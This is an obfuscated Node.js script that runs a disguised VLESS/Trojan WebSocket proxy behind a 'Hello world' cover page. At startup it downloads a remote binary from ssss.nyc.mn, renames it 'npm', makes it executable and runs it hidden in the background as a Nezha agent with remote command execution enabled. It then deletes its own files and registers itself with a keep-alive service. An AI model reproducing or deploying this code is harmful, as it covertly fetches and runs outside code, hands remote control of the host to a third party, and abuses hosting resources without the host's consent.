const _0x3fa2d1=_0x3023;(function(_0x3333e0,_0x1a97b3){const _0x4756b9=_0x3023,_0xb9f8ab=_0x3333e0();while(!![]){try{const _0x1a8f97=parseInt(_0x4756b9(0x1af))/0x1+parseInt(_0x4756b9(0x150))/0x2*(-parseInt(_0x4756b9(0x1a3))/0x3)+parseInt(_0x4756b9(0x148))/0x4*(parseInt(_0x4756b9(0x165))/0x5)+-parseInt(_0x4756b9(0x13f))/0x6*(parseInt(_0x4756b9(0x1b3))/0x7)+parseInt(_0x4756b9(0x1b5))/0x8*(parseInt(_0x4756b9(0x147))/0x9)+-parseInt(_0x4756b9(0x143))/0xa+-parseInt(_0x4756b9(0x149))/0xb*(parseInt(_0x4756b9(0x15b))/0xc);if(_0x1a8f97===_0x1a97b3)break;else _0xb9f8ab['push'](_0xb9f8ab['shift']());}catch(_0xd124a0){_0xb9f8ab['push'](_0xb9f8ab['shift']());}}}(_0x1c7b,0x3cd02));const os=require('os'),http=require(_0x3fa2d1(0x1a4)),fs=require('fs'),axios=require('axios'),net=require('net'),path=require('path'),crypto=require(_0x3fa2d1(0x161)),{Buffer}=require(_0x3fa2d1(0x13e)),{exec,execSync}=require(_0x3fa2d1(0x1a7)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x3fa2d1(0x19a)][_0x3fa2d1(0x18e)]||_0x3fa2d1(0x179),NEZHA_SERVER=process[_0x3fa2d1(0x19a)][_0x3fa2d1(0x156)]||'',NEZHA_PORT=process['env'][_0x3fa2d1(0x199)]||'',NEZHA_KEY=process[_0x3fa2d1(0x19a)]['NEZHA_KEY']||'',DOMAIN=process[_0x3fa2d1(0x19a)][_0x3fa2d1(0x189)]||_0x3fa2d1(0x173),AUTO_ACCESS=process[_0x3fa2d1(0x19a)][_0x3fa2d1(0x146)]||!![],WSPATH=process[_0x3fa2d1(0x19a)]['WSPATH']||UUID[_0x3fa2d1(0x14a)](0x0,0x8),SUB_PATH=process[_0x3fa2d1(0x19a)][_0x3fa2d1(0x185)]||_0x3fa2d1(0x175),NAME=process[_0x3fa2d1(0x19a)][_0x3fa2d1(0x162)]||'',PORT=process[_0x3fa2d1(0x19a)][_0x3fa2d1(0x141)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x169fec=_0x3fa2d1;try{const _0x4b08e8=await axios[_0x169fec(0x197)](_0x169fec(0x17d)),_0x4d4319=_0x4b08e8[_0x169fec(0x178)];ISP=(_0x4d4319[_0x169fec(0x172)]+'-'+_0x4d4319[_0x169fec(0x19d)])[_0x169fec(0x1b2)](/ /g,'_');}catch(_0x110791){ISP=_0x169fec(0x19f);}};GetISP();const httpServer=http[_0x3fa2d1(0x1a2)]((_0x191b90,_0x24e753)=>{const _0x4ddf68=_0x3fa2d1;if(_0x191b90[_0x4ddf68(0x15c)]==='/'){const _0x16b076=path[_0x4ddf68(0x1aa)](__dirname,_0x4ddf68(0x16a));fs[_0x4ddf68(0x16f)](_0x16b076,'utf8',(_0x5c2f43,_0x218438)=>{const _0x4fd5c0=_0x4ddf68;if(_0x5c2f43){_0x24e753[_0x4fd5c0(0x13d)](0xc8,{'Content-Type':_0x4fd5c0(0x181)}),_0x24e753[_0x4fd5c0(0x142)]('Hello\x20world!');return;}_0x24e753['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x24e753[_0x4fd5c0(0x142)](_0x218438);});return;}else{if(_0x191b90[_0x4ddf68(0x15c)]==='/'+SUB_PATH){const _0x1a28ba=NAME?NAME+'-'+ISP:ISP,_0x55f5c2='vless://'+UUID+'@'+DOMAIN+_0x4ddf68(0x198)+DOMAIN+_0x4ddf68(0x14e)+DOMAIN+_0x4ddf68(0x184)+WSPATH+'#'+_0x1a28ba,_0x3baffe=_0x4ddf68(0x14b)+UUID+'@'+DOMAIN+_0x4ddf68(0x192)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x4ddf68(0x184)+WSPATH+'#'+_0x1a28ba,_0x420234=_0x55f5c2+'\x0a'+_0x3baffe,_0x449351=Buffer['from'](_0x420234)['toString'](_0x4ddf68(0x159));_0x24e753[_0x4ddf68(0x13d)](0xc8,{'Content-Type':_0x4ddf68(0x1a1)}),_0x24e753[_0x4ddf68(0x142)](_0x449351+'\x0a');}else _0x24e753[_0x4ddf68(0x13d)](0x194,{'Content-Type':_0x4ddf68(0x1a1)}),_0x24e753['end'](_0x4ddf68(0x167));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x3fa2d1(0x1b2)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x3fa2d1(0x158)];function _0x3023(_0x4b26b1,_0x938514){_0x4b26b1=_0x4b26b1-0x13b;const _0x1c7bf0=_0x1c7b();let _0x302382=_0x1c7bf0[_0x4b26b1];return _0x302382;}function resolveHost(_0x578ac8){return new Promise((_0x5584e0,_0x83415f)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x578ac8)){_0x5584e0(_0x578ac8);return;}let _0x1283fb=0x0;function _0x3c5c92(){const _0x534045=_0x3023;if(_0x1283fb>=DNS_SERVERS[_0x534045(0x14d)]){_0x83415f(new Error(_0x534045(0x153)+_0x578ac8+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x5301f6=DNS_SERVERS[_0x1283fb];_0x1283fb++;const _0x3d7ae7=_0x534045(0x164)+encodeURIComponent(_0x578ac8)+_0x534045(0x144);axios[_0x534045(0x197)](_0x3d7ae7,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x534045(0x183)](_0x175788=>{const _0x10a4f0=_0x534045,_0x4f4b6b=_0x175788['data'];if(_0x4f4b6b['Status']===0x0&&_0x4f4b6b[_0x10a4f0(0x16b)]&&_0x4f4b6b['Answer'][_0x10a4f0(0x14d)]>0x0){const _0x1f5539=_0x4f4b6b[_0x10a4f0(0x16b)][_0x10a4f0(0x191)](_0x24cfc6=>_0x24cfc6[_0x10a4f0(0x168)]===0x1);if(_0x1f5539){_0x5584e0(_0x1f5539[_0x10a4f0(0x178)]);return;}}_0x3c5c92();})[_0x534045(0x1ae)](_0x217f2d=>{_0x3c5c92();});}_0x3c5c92();});}function handleVlessConnection(_0x2f774c,_0x32d50a){const _0x3c8018=_0x3fa2d1,[_0x5d6346]=_0x32d50a,_0x5cd2d1=_0x32d50a[_0x3c8018(0x14a)](0x1,0x11);if(!_0x5cd2d1[_0x3c8018(0x13c)]((_0x399b84,_0xf2bbf7)=>_0x399b84==parseInt(uuid[_0x3c8018(0x18f)](_0xf2bbf7*0x2,0x2),0x10)))return![];let _0x2196b6=_0x32d50a['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x558032=_0x32d50a[_0x3c8018(0x14a)](_0x2196b6,_0x2196b6+=0x2)[_0x3c8018(0x163)](0x0),_0x1015e0=_0x32d50a[_0x3c8018(0x14a)](_0x2196b6,_0x2196b6+=0x1)[_0x3c8018(0x170)](),_0x50af11=_0x1015e0==0x1?_0x32d50a[_0x3c8018(0x14a)](_0x2196b6,_0x2196b6+=0x4)['join']('.'):_0x1015e0==0x2?new TextDecoder()[_0x3c8018(0x160)](_0x32d50a[_0x3c8018(0x14a)](_0x2196b6+0x1,_0x2196b6+=0x1+_0x32d50a['slice'](_0x2196b6,_0x2196b6+0x1)['readUInt8']())):_0x1015e0==0x3?_0x32d50a[_0x3c8018(0x14a)](_0x2196b6,_0x2196b6+=0x10)[_0x3c8018(0x1ac)]((_0x4b0256,_0x4d9788,_0x529ff1,_0x39201b)=>_0x529ff1%0x2?_0x4b0256[_0x3c8018(0x18c)](_0x39201b[_0x3c8018(0x14a)](_0x529ff1-0x1,_0x529ff1+0x1)):_0x4b0256,[])[_0x3c8018(0x157)](_0x1bf732=>_0x1bf732[_0x3c8018(0x163)](0x0)[_0x3c8018(0x15e)](0x10))[_0x3c8018(0x1aa)](':'):'';_0x2f774c[_0x3c8018(0x182)](new Uint8Array([_0x5d6346,0x0]));const _0x4afbcc=createWebSocketStream(_0x2f774c);return resolveHost(_0x50af11)[_0x3c8018(0x183)](_0x49089d=>{const _0x24fabe=_0x3c8018;net['connect']({'host':_0x49089d,'port':_0x558032},function(){const _0x1559e1=_0x3023;this['write'](_0x32d50a[_0x1559e1(0x14a)](_0x2196b6)),_0x4afbcc['on'](_0x1559e1(0x1ab),()=>{})[_0x1559e1(0x1a6)](this)['on'](_0x1559e1(0x1ab),()=>{})['pipe'](_0x4afbcc);})['on'](_0x24fabe(0x1ab),()=>{});})[_0x3c8018(0x1ae)](_0x484111=>{const _0x4b61f0=_0x3c8018;net[_0x4b61f0(0x16c)]({'host':_0x50af11,'port':_0x558032},function(){const _0x250419=_0x4b61f0;this['write'](_0x32d50a[_0x250419(0x14a)](_0x2196b6)),_0x4afbcc['on'](_0x250419(0x1ab),()=>{})[_0x250419(0x1a6)](this)['on'](_0x250419(0x1ab),()=>{})['pipe'](_0x4afbcc);})['on'](_0x4b61f0(0x1ab),()=>{});}),!![];}function handleTrojanConnection(_0x5074fb,_0x2b76a9){const _0x2fedda=_0x3fa2d1;try{if(_0x2b76a9[_0x2fedda(0x14d)]<0x3a)return![];const _0xd9ccb5=_0x2b76a9[_0x2fedda(0x14a)](0x0,0x38)[_0x2fedda(0x15e)](),_0x433021=[UUID];let _0x3fce4d=null;for(const _0x3604f2 of _0x433021){const _0x1a186f=crypto[_0x2fedda(0x14f)](_0x2fedda(0x1b1))[_0x2fedda(0x145)](_0x3604f2)[_0x2fedda(0x1b4)](_0x2fedda(0x166));if(_0x1a186f===_0xd9ccb5){_0x3fce4d=_0x3604f2;break;}}if(!_0x3fce4d)return![];let _0x247486=0x38;_0x2b76a9[_0x247486]===0xd&&_0x2b76a9[_0x247486+0x1]===0xa&&(_0x247486+=0x2);const _0x39cd17=_0x2b76a9[_0x247486];if(_0x39cd17!==0x1)return![];_0x247486+=0x1;const _0x23cd21=_0x2b76a9[_0x247486];_0x247486+=0x1;let _0x525326,_0x3ba01f;if(_0x23cd21===0x1)_0x525326=_0x2b76a9[_0x2fedda(0x14a)](_0x247486,_0x247486+0x4)[_0x2fedda(0x1aa)]('.'),_0x247486+=0x4;else{if(_0x23cd21===0x3){const _0x37a966=_0x2b76a9[_0x247486];_0x247486+=0x1,_0x525326=_0x2b76a9['slice'](_0x247486,_0x247486+_0x37a966)[_0x2fedda(0x15e)](),_0x247486+=_0x37a966;}else{if(_0x23cd21===0x4)_0x525326=_0x2b76a9[_0x2fedda(0x14a)](_0x247486,_0x247486+0x10)[_0x2fedda(0x1ac)]((_0x444bea,_0x455207,_0x18f6e6,_0x224e30)=>_0x18f6e6%0x2?_0x444bea[_0x2fedda(0x18c)](_0x224e30[_0x2fedda(0x14a)](_0x18f6e6-0x1,_0x18f6e6+0x1)):_0x444bea,[])['map'](_0x15d558=>_0x15d558[_0x2fedda(0x163)](0x0)[_0x2fedda(0x15e)](0x10))[_0x2fedda(0x1aa)](':'),_0x247486+=0x10;else return![];}}_0x3ba01f=_0x2b76a9[_0x2fedda(0x163)](_0x247486),_0x247486+=0x2;_0x247486<_0x2b76a9[_0x2fedda(0x14d)]&&_0x2b76a9[_0x247486]===0xd&&_0x2b76a9[_0x247486+0x1]===0xa&&(_0x247486+=0x2);const _0x127cf7=createWebSocketStream(_0x5074fb);return resolveHost(_0x525326)[_0x2fedda(0x183)](_0x2d7137=>{const _0x4db7e1=_0x2fedda;net[_0x4db7e1(0x16c)]({'host':_0x2d7137,'port':_0x3ba01f},function(){const _0x4c456c=_0x4db7e1;_0x247486<_0x2b76a9[_0x4c456c(0x14d)]&&this['write'](_0x2b76a9[_0x4c456c(0x14a)](_0x247486)),_0x127cf7['on'](_0x4c456c(0x1ab),()=>{})[_0x4c456c(0x1a6)](this)['on'](_0x4c456c(0x1ab),()=>{})[_0x4c456c(0x1a6)](_0x127cf7);})['on']('error',()=>{});})['catch'](_0x5cdbb1=>{const _0x1344b3=_0x2fedda;net['connect']({'host':_0x525326,'port':_0x3ba01f},function(){const _0x2ac760=_0x3023;_0x247486<_0x2b76a9[_0x2ac760(0x14d)]&&this[_0x2ac760(0x16e)](_0x2b76a9[_0x2ac760(0x14a)](_0x247486)),_0x127cf7['on'](_0x2ac760(0x1ab),()=>{})['pipe'](this)['on'](_0x2ac760(0x1ab),()=>{})[_0x2ac760(0x1a6)](_0x127cf7);})['on'](_0x1344b3(0x1ab),()=>{});}),!![];}catch(_0x447850){return![];}}wss['on'](_0x3fa2d1(0x18a),(_0x3aab04,_0x28c482)=>{const _0x38d310=_0x3fa2d1,_0x4f83b8=_0x28c482[_0x38d310(0x15c)]||'';_0x3aab04[_0x38d310(0x194)](_0x38d310(0x171),_0x2605e8=>{const _0x431f9d=_0x38d310;if(_0x2605e8['length']>0x11&&_0x2605e8[0x0]===0x0){const _0x17d85a=_0x2605e8[_0x431f9d(0x14a)](0x1,0x11),_0x1ef4db=_0x17d85a[_0x431f9d(0x13c)]((_0x20542d,_0x4a15bc)=>_0x20542d==parseInt(uuid[_0x431f9d(0x18f)](_0x4a15bc*0x2,0x2),0x10));if(_0x1ef4db){!handleVlessConnection(_0x3aab04,_0x2605e8)&&_0x3aab04['close']();return;}}!handleTrojanConnection(_0x3aab04,_0x2605e8)&&_0x3aab04[_0x431f9d(0x1a0)]();})['on'](_0x38d310(0x1ab),()=>{});});const getDownloadUrl=()=>{const _0x256bcb=_0x3fa2d1,_0x47bc73=os['arch']();return _0x47bc73===_0x256bcb(0x176)||_0x47bc73===_0x256bcb(0x15a)||_0x47bc73==='aarch64'?!NEZHA_PORT?_0x256bcb(0x187):_0x256bcb(0x195):!NEZHA_PORT?_0x256bcb(0x18b):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x3668da=_0x3fa2d1;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x55987a=getDownloadUrl(),_0x3aed82=await axios({'method':_0x3668da(0x197),'url':_0x55987a,'responseType':'stream'}),_0x5bc378=fs['createWriteStream'](_0x3668da(0x17c));return _0x3aed82[_0x3668da(0x178)]['pipe'](_0x5bc378),new Promise((_0xc07c9f,_0x3b909f)=>{const _0x136a32=_0x3668da;_0x5bc378['on']('finish',()=>{const _0x424b24=_0x3023;console[_0x424b24(0x174)](_0x424b24(0x155)),exec(_0x424b24(0x15f),_0xcfc586=>{if(_0xcfc586)_0x3b909f(_0xcfc586);_0xc07c9f();});}),_0x5bc378['on'](_0x136a32(0x1ab),_0x3b909f);});}catch(_0x216931){throw _0x216931;}},runnz=async()=>{const _0x3a79b3=_0x3fa2d1;try{const _0x12d2a6=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x12d2a6[_0x3a79b3(0x17e)]()!==''){console[_0x3a79b3(0x174)](_0x3a79b3(0x177));return;}}catch(_0x17cef5){}await downloadFile();let _0x2f239d='',_0x135f03=[_0x3a79b3(0x169),_0x3a79b3(0x140),_0x3a79b3(0x19b),_0x3a79b3(0x17a),'2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x364672=_0x135f03['includes'](NEZHA_PORT)?_0x3a79b3(0x188):'';_0x2f239d=_0x3a79b3(0x1a5)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x364672+_0x3a79b3(0x17b);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x410a29=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x3a79b3(0x1a8)](':')[_0x3a79b3(0x14c)]():'',_0x5d064b=_0x135f03[_0x3a79b3(0x193)](_0x410a29)?'true':_0x3a79b3(0x19e),_0x10f4cd=_0x3a79b3(0x13b)+NEZHA_KEY+_0x3a79b3(0x1a9)+NEZHA_SERVER+_0x3a79b3(0x151)+_0x5d064b+_0x3a79b3(0x152)+UUID;fs[_0x3a79b3(0x17f)]('config.yaml',_0x10f4cd);}_0x2f239d='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log'](_0x3a79b3(0x196));return;}}try{exec(_0x2f239d,{'shell':'/bin/bash'},_0x523758=>{const _0x2c24cb=_0x3a79b3;if(_0x523758)console[_0x2c24cb(0x1ab)](_0x2c24cb(0x15d),_0x523758);else console[_0x2c24cb(0x174)]('npm\x20is\x20running');});}catch(_0xffe540){console[_0x3a79b3(0x1ab)](_0x3a79b3(0x180)+_0xffe540);}};async function addAccessTask(){const _0x516cd9=_0x3fa2d1;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1b45a6=_0x516cd9(0x186)+DOMAIN;try{const _0x538dd8=await axios[_0x516cd9(0x16d)](_0x516cd9(0x190),{'url':_0x1b45a6},{'headers':{'Content-Type':_0x516cd9(0x1ad)}});console[_0x516cd9(0x174)](_0x516cd9(0x18d));}catch(_0x2992b7){}}const delFiles=()=>{const _0x3d606c=_0x3fa2d1;fs[_0x3d606c(0x19c)](_0x3d606c(0x17c),()=>{}),fs[_0x3d606c(0x19c)](_0x3d606c(0x154),()=>{});};function _0x1c7b(){const _0x5d0a4e=['&fp=chrome&type=ws&host=','createHash','74ldKXvC','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Failed\x20to\x20resolve\x20','config.yaml','npm\x20download\x20successfully','NEZHA_SERVER','map','1.1.1.1','base64','arm64','1404wxyUtX','url','npm\x20running\x20error:','toString','chmod\x20+x\x20npm','decode','crypto','NAME','readUInt16BE','https://dns.google/resolve?name=','35pWKOAE','hex','Not\x20Found\x0a','type','443','index.html','Answer','connect','post','write','readFile','readUInt8','message','country_code','1234.abc.com','log','df33e5df','arm','npm\x20is\x20already\x20running,\x20skip\x20running...','data','8b0d4796-f9e4-475f-a0f2-54dc9de6d8cf','2087','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','npm','https://api.ip.sb/geoip','trim','writeFileSync','error:\x20','text/html','send','then','&path=%2F','SUB_PATH','https://','https://arm64.ssss.nyc.mn/v1','--tls','DOMAIN','connection','https://amd64.ssss.nyc.mn/v1','concat','Automatic\x20Access\x20Task\x20added\x20successfully','UUID','substr','https://oooo.serv00.net/add-url','find',':443?security=tls&sni=','includes','once','https://arm64.ssss.nyc.mn/agent','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','get',':443?encryption=none&security=tls&sni=','NEZHA_PORT','env','2096','unlink','isp','false','Unknown','close','text/plain','createServer','14889FzMSXw','http','setsid\x20nohup\x20./npm\x20-s\x20','pipe','child_process','split','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','join','error','reduce','application/json','catch','253740dAlwyE','listen','sha224','replace','909503KrGdHO','digest','2798600UWJVVa','client_secret:\x20','every','writeHead','buffer','18DKJmDp','8443','PORT','end','367910AYMdDf','&type=A','update','AUTO_ACCESS','9TaJzIs','165656odcESI','3212qWwXwP','slice','trojan://','pop','length'];_0x1c7b=function(){return _0x5d0a4e;};return _0x1c7b();}httpServer[_0x3fa2d1(0x1b0)](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
